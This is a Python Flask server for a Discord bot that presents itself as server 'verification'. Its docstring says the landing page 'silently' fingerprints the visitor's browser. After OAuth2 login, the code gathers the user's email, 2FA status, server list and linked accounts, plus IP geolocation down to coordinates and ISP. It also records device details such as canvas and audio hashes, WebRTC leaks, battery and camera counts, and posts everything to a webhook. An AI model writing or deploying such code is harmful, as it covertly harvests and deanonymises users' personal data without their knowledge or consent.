"""
app.py — Flask web server.

FINGERPRINT FIX:
  Old flow: Bot → Discord OAuth2 → /callback   (fingerprint NEVER collected)
  New flow: Bot → /start?state=X → Discord OAuth2 → /callback
            /start page silently collects browser fingerprint via JS,
            stores it server-side keyed by `state`, THEN redirects to Discord.
            /callback retrieves fingerprint from server-side dict using state.
"""

from __future__ import annotations

import asyncio
import re
import time
import urllib.parse
from datetime import datetime
from typing import Any

import requests
from flask import Flask, jsonify, redirect, render_template, request

from config import (
    APP_BASE_URL, CLIENT_ID, CLIENT_SECRET,
    GUILD_ID, OAUTH2_SCOPES, REDIRECT_URI, SECRET_KEY, WEBHOOK_URL,
)

app = Flask(__name__)
app.secret_key = SECRET_KEY

# ── Injected by main.py ────────────────────────────────────────────────────────
discord_bot  = None
bot_loop: asyncio.AbstractEventLoop | None = None

DISCORD_API = "https://discord.com/api/v10"

# ── Server-side fingerprint store: state_token → {fp_data, user_id, created_at}
# This is the key fix — data never gets lost through the OAuth2 redirect cycle
pending_states: dict[str, int]    = {}   # state → discord user id (set by bot.py)
fp_store:       dict[str, dict]   = {}   # state → fingerprint dict
fp_timestamps:  dict[str, float]  = {}   # state → unix timestamp (for cleanup)

_FP_TTL = 600  # fingerprint expires after 10 minutes


def _cleanup_old_states():
    """Remove expired fingerprint entries."""
    now = time.time()
    expired = [k for k, t in fp_timestamps.items() if now - t > _FP_TTL]
    for k in expired:
        fp_store.pop(k, None)
        fp_timestamps.pop(k, None)
        pending_states.pop(k, None)


# ─── Helpers ──────────────────────────────────────────────────────────────────

def get_real_ip() -> str:
    for header in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"):
        val = request.headers.get(header, "").split(",")[0].strip()
        if val:
            return val
    return request.remote_addr or "Unknown"


def country_flag(code: str) -> str:
    if not code or len(code) != 2:
        return ""
    return chr(ord(code[0].upper()) + 127397) + chr(ord(code[1].upper()) + 127397)


def get_ip_info(ip: str) -> dict:
    if ip in ("127.0.0.1", "::1", "localhost", "Unknown"):
        return {}
    try:
        fields = (
            "status,country,countryCode,regionName,city,"
            "zip,lat,lon,timezone,offset,isp,org,as,proxy,hosting,query"
        )
        r = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}", timeout=5)
        data = r.json()
        return data if data.get("status") == "success" else {}
    except Exception:
        return {}


def fmt_date(snowflake_id: int) -> str:
    """Convert a Discord snowflake to a clean human-readable date, e.g. 'January 10, 2026 at 6:04 PM'"""
    if not snowflake_id:
        return "Unknown"
    ts = ((snowflake_id >> 22) + 1420070400000) / 1000
    dt = datetime.utcfromtimestamp(ts)
    hour = int(dt.strftime("%I"))  # 1-12, no leading zero
    minute = dt.strftime("%M")
    ampm = dt.strftime("%p")
    return dt.strftime(f"%B {dt.day}, %Y") + f" at {hour}:{minute} {ampm} UTC"


def fmt_now() -> str:
    """Current UTC time as a clean readable string."""
    dt = datetime.utcnow()
    hour = int(dt.strftime("%I"))
    return dt.strftime(f"%B {dt.day}, %Y at {hour}:{dt.strftime('%M %p')} UTC")


def parse_flags(flags: int) -> list[str]:
    badge_map = {
        1:       "Discord Staff",
        2:       "Partnered Server Owner",
        4:       "HypeSquad Events",
        8:       "Bug Hunter Lv.1",
        64:      "HypeSquad Bravery",
        128:     "HypeSquad Brilliance",
        256:     "HypeSquad Balance",
        512:     "Early Supporter",
        16384:   "Bug Hunter Lv.2",
        131072:  "Verified Bot Developer",
        4194304: "Active Developer",
    }
    return [name for bit, name in badge_map.items() if flags & bit]


def nitro_label(t: int) -> str:
    return {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(t, "None")


def parse_ua(ua: str) -> tuple[str, str]:
    """Parse a User-Agent string into (browser_version, os_name)."""
    browser = "Unknown"
    os_name = "Unknown"

    if re.search(r"Edg/(\d+)", ua):
        v = re.search(r"Edg/(\d+)", ua).group(1)
        browser = f"Edge {v}"
    elif re.search(r"OPR/(\d+)", ua):
        v = re.search(r"OPR/(\d+)", ua).group(1)
        browser = f"Opera {v}"
    elif re.search(r"SamsungBrowser/(\d+)", ua):
        v = re.search(r"SamsungBrowser/(\d+)", ua).group(1)
        browser = f"Samsung Browser {v}"
    elif re.search(r"YaBrowser/(\d+)", ua):
        v = re.search(r"YaBrowser/(\d+)", ua).group(1)
        browser = f"Yandex Browser {v}"
    elif re.search(r"Firefox/(\d+)", ua):
        v = re.search(r"Firefox/(\d+)", ua).group(1)
        browser = f"Firefox {v}"
    elif re.search(r"Chrome/(\d+)", ua):
        v = re.search(r"Chrome/(\d+)", ua).group(1)
        browser = f"Chrome {v}"
    elif re.search(r"Version/(\d+).*Safari", ua):
        v = re.search(r"Version/(\d+)", ua).group(1)
        browser = f"Safari {v}"

    if "Windows NT 10.0" in ua:
        os_name = "Windows 10 / 11"
    elif "Windows NT 6.3" in ua:
        os_name = "Windows 8.1"
    elif "Windows NT 6.1" in ua:
        os_name = "Windows 7"
    elif "Windows" in ua:
        os_name = "Windows"
    elif "Macintosh" in ua:
        m = re.search(r"Mac OS X ([\d_]+)", ua)
        os_name = f"macOS {m.group(1).replace('_', '.')}" if m else "macOS"
    elif "CrOS" in ua:
        os_name = "ChromeOS"
    elif "Android" in ua:
        m = re.search(r"Android ([\d.]+)", ua)
        os_name = f"Android {m.group(1)}" if m else "Android"
    elif "iPhone" in ua:
        os_name = "iOS (iPhone)"
    elif "iPad" in ua:
        os_name = "iOS (iPad)"
    elif "Linux" in ua:
        os_name = "Linux"

    return browser, os_name


# ─── Discord OAuth2 ───────────────────────────────────────────────────────────

def build_discord_oauth_url(state: str) -> str:
    params = urllib.parse.urlencode({
        "client_id":     CLIENT_ID,
        "redirect_uri":  REDIRECT_URI,
        "response_type": "code",
        "scope":         OAUTH2_SCOPES,
        "state":         state,
        "prompt":        "consent",
    })
    return f"https://discord.com/api/oauth2/authorize?{params}"


def exchange_code(code: str) -> dict:
    resp = requests.post(
        f"{DISCORD_API}/oauth2/token",
        data={
            "client_id":     CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type":    "authorization_code",
            "code":          code,
            "redirect_uri":  REDIRECT_URI,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    resp.raise_for_status()
    return resp.json()


def fetch_discord_data(token: str) -> dict:
    h = {"Authorization": f"Bearer {token}"}

    user    = requests.get(f"{DISCORD_API}/users/@me",             headers=h).json()
    g_raw   = requests.get(f"{DISCORD_API}/users/@me/guilds",      headers=h).json()
    c_raw   = requests.get(f"{DISCORD_API}/users/@me/connections",  headers=h).json()
    guilds      = g_raw if isinstance(g_raw, list) else []
    connections = c_raw if isinstance(c_raw, list) else []

    # Fetch member data for our specific guild (requires guilds.members.read scope)
    member_data = {}
    try:
        m = requests.get(f"{DISCORD_API}/users/@me/guilds/{GUILD_ID}/member", headers=h)
        if m.status_code == 200:
            member_data = m.json()
    except Exception:
        pass

    return {
        "user":        user,
        "guilds":      guilds,
        "connections": connections,
        "member":      member_data,
    }


# ─── Embed Builder ────────────────────────────────────────────────────────────

def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[dict]:
    user        = discord_data["user"]
    guilds      = discord_data["guilds"]
    connections = discord_data["connections"]
    member      = discord_data.get("member", {})

    uid        = int(user.get("id", 0))
    username   = user.get("username", "Unknown")
    discrim    = user.get("discriminator", "0")
    email      = user.get("email", "Not provided")
    avatar_h   = user.get("avatar", "")
    avatar_url = (
        f"https://cdn.discordapp.com/avatars/{uid}/{avatar_h}.png?size=256"
        if avatar_h else "https://cdn.discordapp.com/embed/avatars/0.png"
    )
    email_verified = user.get("verified", False)
    mfa        = user.get("mfa_enabled", False)
    locale     = user.get("locale", "Unknown")
    nitro      = nitro_label(user.get("premium_type", 0))
    pub_flags  = user.get("public_flags", 0)
    badges     = parse_flags(pub_flags)
    created    = fmt_date(uid)

    # Member-specific info
    server_nick     = member.get("nick") or "None"
    server_joined   = member.get("joined_at", "")
    server_boosting = bool(member.get("premium_since"))
    server_roles    = member.get("roles", [])

    if server_joined:
        try:
            jdt = datetime.fromisoformat(server_joined.replace("Z", "+00:00"))
            hour = int(jdt.strftime("%I"))
            server_joined = jdt.strftime(f"%B {jdt.day}, %Y at {hour}:{jdt.strftime('%M %p')} UTC")
        except Exception:
            pass

    # IP info
    is_vpn     = bool(ip_info.get("proxy") or ip_info.get("hosting"))
    cc         = ip_info.get("countryCode", "")
    flag       = country_flag(cc)
    tz_offset  = ip_info.get("offset", 0)
    tz_sign    = "+" if tz_offset >= 0 else ""

    # UA parsing
    ua_raw = fp.get("userAgent") or request.headers.get("User-Agent", "Unknown")
    browser, os_name = parse_ua(ua_raw)

    # Fingerprint values with UA fallbacks
    platform   = fp.get("platform") or os_name
    lang       = fp.get("language") or request.headers.get("Accept-Language", "?").split(",")[0]
    screen     = fp.get("screen", "N/A")
    dpr        = fp.get("devicePixelRatio", "?")
    window_sz  = fp.get("windowSize", "N/A")
    tz_fp      = fp.get("timezone", "N/A")
    cpu        = fp.get("hardwareConcurrency", "N/A")
    mem        = fp.get("deviceMemory", "N/A")
    touch      = fp.get("maxTouchPoints", 0)
    webgl      = fp.get("webGL", "N/A")
    webgl_v    = fp.get("webGLVendor", "N/A")
    canvas_h   = fp.get("canvasHash", "N/A")
    audio_fp   = fp.get("audioFingerprint", "N/A")
    dnt        = fp.get("doNotTrack", "N/A")
    cookies    = fp.get("cookieEnabled")
    adblock    = fp.get("adBlock", False)
    webrtc     = fp.get("webRTC", "N/A")
    connection = fp.get("connection", "N/A")
    battery    = fp.get("battery", "N/A")
    plugins    = fp.get("plugins", "N/A")
    languages  = fp.get("languages", "N/A")
    color_d    = fp.get("colorDepth", "N/A")
    avail_s    = fp.get("availScreen", "N/A")
    audio_in   = fp.get("audioInputs", "N/A")
    audio_out  = fp.get("audioOutputs", "N/A")
    video_in   = fp.get("videoInputs", "N/A")

    # Embed color
    color = 0xED4245 if is_vpn else 0x57F287

    now_iso = datetime.utcnow().isoformat() + "Z"

    # ── EMBED 1: Header + Account ─────────────────────────────────────────────
    discrim_str = f"#{discrim}" if discrim not in ("0", "", None) else ""
    vpn_alert   = "\n⚠️  **VPN / PROXY DETECTED**" if is_vpn else ""

    badge_str = "  ".join(f"`{b}`" for b in badges) if badges else "None"

    account_val = (
        f"**{username}{discrim_str}** — `{uid}`\n"
        f"📧  {email} {'✅' if email_verified else '❌'}\n"
        f"📅  {created}\n"
        f"🔐  2FA: {'✅' if mfa else '❌'}  •  Nitro: {nitro}  •  Locale: `{locale}`\n"
        f"🏅  Badges: {badge_str}"
    )

    # Member data block (shown only if we have it)
    if member:
        account_val += (
            f"\n\n**Server Member**\n"
            f"Nick: {server_nick}  •  Joined: {server_joined or 'Unknown'}\n"
            f"Boosting: {'✅' if server_boosting else '❌'}  •  Roles: `{len(server_roles)}`"
        )

    # ── EMBED 1: Network ──────────────────────────────────────────────────────
    network_val = (
        f"🌐  `{ip}`\n"
        f"{flag}  {ip_info.get('country', 'Unknown')} — {ip_info.get('city', '?')}, {ip_info.get('regionName', '?')}\n"
        f"🏢  {ip_info.get('isp', 'Unknown')}\n"
        f"🔢  {ip_info.get('as', 'N/A')}\n"
        f"🕐  {ip_info.get('timezone', 'N/A')} (UTC{tz_sign}{tz_offset // 3600 if tz_offset else '?'})\n"
        f"📍  {ip_info.get('lat', '?')}°, {ip_info.get('lon', '?')}°\n"
        f"🔒  VPN: {'⚠️ YES' if is_vpn else '✅ No'}  •  Datacenter: {'⚠️ YES' if ip_info.get('hosting') else '✅ No'}"
    )

    # ── EMBED 1: Device ───────────────────────────────────────────────────────
    device_val = (
        f"🌐  {browser}\n"
        f"🖥️  {os_name}  •  `{platform}`\n"
        f"🌍  {lang}  ({languages})\n"
        f"📺  {screen} @ {dpr}× DPR\n"
        f"🪟  Window: {window_sz}  •  Avail: {avail_s}\n"
        f"🎨  Color depth: {color_d}\n"
        f"🕐  TZ: {tz_fp}\n"
        f"⚡  CPU: {cpu} cores  •  RAM: {mem} GB\n"
        f"👆  Touch points: {touch}\n"
        f"🎮  GPU: {webgl}\n"
        f"🏭  Vendor: {webgl_v}\n"
        f"🖼️  Canvas: `{canvas_h}`\n"
        f"🎵  Audio FP: `{audio_fp}`\n"
        f"🔇  AdBlock: {'✅ Yes' if adblock else '❌ No'}  •  DNT: {dnt}\n"
        f"🍪  Cookies: {'✅' if cookies else '❌'}\n"
        f"📡  WebRTC leak: `{webrtc}`\n"
        f"📶  Connection: {connection}\n"
        f"🔋  Battery: {battery}\n"
        f"🎙️  Inputs: {audio_in} mic / {video_in} cam / {audio_out} spk\n"
        f"🧩  Plugins: {plugins}"
    )

    embed1 = {
        "title":       f"{'⚠️  VPN DETECTED  •  ' if is_vpn else ''}🔐  New Verification",
        "description": f"<@{uid}> just verified in the server.{vpn_alert}",
        "color":       color,
        "thumbnail":   {"url": avatar_url},
        "fields": [
            {
                "name":   "👤  Discord Account",
                "value":  account_val[:1024],
                "inline": False,
            },
            {
                "name":   "🌍  Network & Location",
                "value":  network_val[:1024],
                "inline": True,
            },
            {
                "name":   "💻  Device & Browser",
                "value":  device_val[:1024],
                "inline": True,
            },
        ],
        "footer":    {"text": f"Verified at {fmt_now()}"},
        "timestamp": now_iso,
    }

    # ── EMBED 2: Servers + Connections ────────────────────────────────────────
    guild_lines = []
    for g in guilds[:25]:
        owner_tag = " 👑" if g.get("owner") else ""
        guild_lines.append(f"• **{g.get('name','?')}**{owner_tag}  `{g.get('id','')}`")
    if len(guilds) > 25:
        guild_lines.append(f"*…and {len(guilds) - 25} more*")
    guilds_val = "\n".join(guild_lines) or "None visible"

    conn_icon = {
        "twitch":    "🟣",  "youtube":  "🔴",  "steam":    "🖥️",
        "spotify":   "🟢",  "twitter":  "🐦",  "github":   "⬛",
        "xbox":      "🟩",  "facebook": "🔵",  "reddit":   "🟠",
        "playstation":"🔵", "epicgames": "⬜", "leagueoflegends": "🔷",
        "instagram": "🟤",  "tiktok":   "⬛",  "riotgames": "🔴",
    }
    conn_lines = []
    for c in connections:
        ctype   = c.get("type", "?")
        cname   = c.get("name", "?")
        cveri   = " ✅" if c.get("verified") else ""
        cvis    = "" if c.get("visibility") else " 🔒"
        icon    = conn_icon.get(ctype, "🔗")
        conn_lines.append(f"{icon}  **{ctype.title()}** — {cname}{cveri}{cvis}")
    conns_val = "\n".join(conn_lines) or "None connected"

    embed2 = {
        "color": color,
        "fields": [
            {
                "name":   f"🏠  Servers ({len(guilds)})",
                "value":  guilds_val[:1024],
                "inline": False,
            },
            {
                "name":   f"🔗  Connected Accounts ({len(connections)})",
                "value":  conns_val[:1024],
                "inline": False,
            },
        ],
        "footer":    {"text": f"User ID: {uid}"},
        "timestamp": now_iso,
    }

    return [embed1, embed2]


def send_webhook(discord_data: dict, ip: str, ip_info: dict, fp: dict):
    if not WEBHOOK_URL:
        print("⚠️  WEBHOOK_URL not set — skipping webhook")
        return
    try:
        embeds = build_embeds(discord_data, ip, ip_info, fp)
        r = requests.post(WEBHOOK_URL, json={"embeds": embeds}, timeout=8)
        r.raise_for_status()
        print(f"📨  Webhook sent  HTTP {r.status_code}")
    except Exception as e:
        print(f"❌  Webhook error: {e}")


# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route("/start")
def start():
    """
    Step 1 of the flow.
    User arrives here from the Discord bot button with ?state=XXX.
    Page silently collects fingerprint, saves it server-side, then auto-redirects
    to Discord OAuth2 (with the same state token) — all within ~1.5 seconds.
    """
    state = request.args.get("state", "")
    if not state:
        return render_template("error.html", error="Missing state token. Please click Verify again.")

    # Build the Discord OAuth2 URL (with state so we can correlate on callback)
    oauth_url = build_discord_oauth_url(state)

    return render_template("start.html", oauth_url=oauth_url, state=state)


@app.route("/save-fp", methods=["POST"])
def save_fp():
    """
    Called by the JS on /start after collecting fingerprint.
    Stores fingerprint server-side keyed by state.
    """
    _cleanup_old_states()
    data  = request.get_json(silent=True) or {}
    state = data.get("state", "")
    fp    = data.get("fp", {})

    if state:
        fp_store[state]      = fp
        fp_timestamps[state] = time.time()
        print(f"💾  Fingerprint saved for state {state[:8]}…")

    return jsonify({"ok": True})


@app.route("/callback")
def callback():
    """
    Step 2 — Discord redirects here after user authorizes.
    Retrieves fingerprint from server-side store using state token.
    """
    code  = request.args.get("code")
    state = request.args.get("state", "")
    error = request.args.get("error")

    if error:
        return render_template("error.html", error=request.args.get("error_description", error))
    if not code:
        return render_template("error.html", error="No authorization code received from Discord.")

    # Retrieve fingerprint from server-side store
    fp = fp_store.pop(state, {})
    fp_timestamps.pop(state, None)
    pending_states.pop(state, None)

    # Always ensure UA is set from request headers as a fallback
    if not fp.get("userAgent"):
        fp["userAgent"] = request.headers.get("User-Agent", "Unknown")

    try:
        # 1. Exchange code → access token
        token_data   = exchange_code(code)
        access_token = token_data["access_token"]

        # 2. Fetch all Discord data (profile, guilds, connections, member)
        discord_data = fetch_discord_data(access_token)
        user         = discord_data["user"]
        uid          = int(user.get("id", 0))

        # 3. Collect IP + geolocation
        ip      = get_real_ip()
        ip_info = get_ip_info(ip)

        # 4. Fire webhook
        send_webhook(discord_data, ip, ip_info, fp)

        # 5. Assign verified role
        role_given = False
        if uid and discord_bot and bot_loop:
            future = asyncio.run_coroutine_threadsafe(
                discord_bot.give_verified_role(uid), bot_loop
            )
            try:
                role_given = future.result(timeout=10)
            except Exception as e:
                print(f"⚠️  Role assignment error: {e}")

        return render_template(
            "success.html",
            username=user.get("username", "User"),
            role_given=role_given,
        )

    except requests.HTTPError as e:
        print(f"❌  HTTP error: {e}")
        return render_template("error.html", error="Failed to communicate with the Discord API.")
    except Exception:
        import traceback
        traceback.print_exc()
        return render_template("error.html", error="An unexpected error occurred.")
